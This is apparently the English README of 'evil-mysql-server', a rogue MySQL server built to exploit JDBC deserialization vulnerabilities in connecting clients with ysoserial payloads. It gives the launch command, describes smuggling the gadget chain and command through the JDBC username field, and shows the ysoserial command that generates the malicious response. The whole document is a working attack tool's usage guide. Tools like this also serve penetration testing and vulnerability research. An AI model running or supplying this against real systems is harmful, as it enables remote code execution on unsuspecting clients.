# evil mysql server

English | [简体中文](./README-zh_CN.md)

**evil-mysql-server** is a malicious database written to target jdbc deserialization vulnerabilities and requires ysoserial.

Usage

```shell
. /evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar
```


After successful startup use jdbc to connect, where the username format is `yso_payload_command`, after successful connection **evil-mysql-server** will parse the username and generate malicious data back to the jdbc client using the following command.

```shell
java -jar ysoserial.jar CommonsCollections1 calc.exe
```